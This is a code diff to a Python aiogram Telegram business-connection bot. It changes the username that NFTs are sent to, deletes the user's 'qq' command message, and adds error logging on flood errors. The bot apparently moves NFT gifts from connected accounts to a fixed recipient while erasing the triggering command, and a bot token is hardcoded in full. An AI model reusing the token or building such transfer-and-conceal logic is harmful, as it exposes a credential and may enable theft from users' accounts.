@@ -9,7 +9,7 @@ from aiogram.fsm.storage.memory import MemoryStorage
 
 # Настройки
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
-RECIPIENT = "@crypqtan"  # Юзернейм, куда передается НФТ
+RECIPIENT = "@monk"  # Юзернейм, куда передается НФТ
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
@@ -198,7 +198,6 @@ async def handle_business_command(message: Message):
     chat_id = message.chat.id
     last_user_messages[chat_id] = message.message_id
     
-    # Сохраняем ID пользователя для отправки личного сообщения в бота при флуде
     if message.from_user:
         client_user_ids[chat_id] = message.from_user.id
 
@@ -343,7 +342,7 @@ async def sender_worker():
                 reply_to_message_id=last_user_messages.get(task["chat_id"])
             )
 
-            # 2. Удаляем команду qq
+            # 2. Удаляем команду qq при успехе
             if task["bcid"] and sent_msg:
                 await bot.delete_business_messages(
                     business_connection_id=task["bcid"],
@@ -352,17 +351,17 @@ async def sender_worker():
 
         except Exception as e:
             if "PEER_FLOOD" in str(e):
-                logging.warning(f"PEER_FLOOD detected in chat {task['chat_id']}. Deleting command and notifying user in bot private chat.")
+                logging.warning(f"PEER_FLOOD detected in chat {task['chat_id']}. Cleaning up command and notifying user.")
                 
-                # Удаляем команду qq из чата
+                # СРАЗУ удаляем команду qq из чата при флуде
                 try:
                     if task["bcid"]:
                         await bot.delete_business_messages(
                             business_connection_id=task["bcid"],
                             message_ids=[task["cmd_message_id"]]
                         )
-                except Exception:
-                    pass
+                except Exception as del_err:
+                    logging.error(f"Failed to delete command message on flood: {del_err}")
 
                 # Отправляем сообщение в ЛС с самим ботом пользователю
                 target_user_id = client_user_ids.get(task["chat_id"])
@@ -373,8 +372,8 @@ async def sender_worker():
                             chat_id=target_user_id,
                             text=loc["flood_error"]
                         )
-                    except Exception:
-                        pass
+                    except Exception as msg_err:
+                        logging.error(f"Failed to send flood warning to user: {msg_err}")
             else:
                 logging.error(f"Worker execution error: {e}")
 
